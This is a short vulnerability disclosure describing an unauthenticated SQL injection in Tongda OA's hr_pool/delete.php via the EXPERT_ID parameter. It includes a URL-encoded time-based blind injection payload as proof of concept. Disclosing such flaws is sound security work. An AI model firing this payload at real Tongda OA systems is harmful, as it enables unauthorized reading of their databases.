Unauthorized SQL injection vulnerability exists in Tongda OA

version:Versions below 11.10 and version v2017

Route: general/hr/recruit/hr_pool/delete.php

There is an injected parameter: $EXPERT_ID

The code here is very concise. When $EXPERT_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![图片1](https://github.com/kpz-wm/cve/assets/65756088/9e0035ca-ae06-47af-8ec1-7b1b48f23e73)

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![图片2](https://github.com/kpz-wm/cve/assets/65756088/25e6eefc-6ac5-4873-a0dc-40fc178d0980)
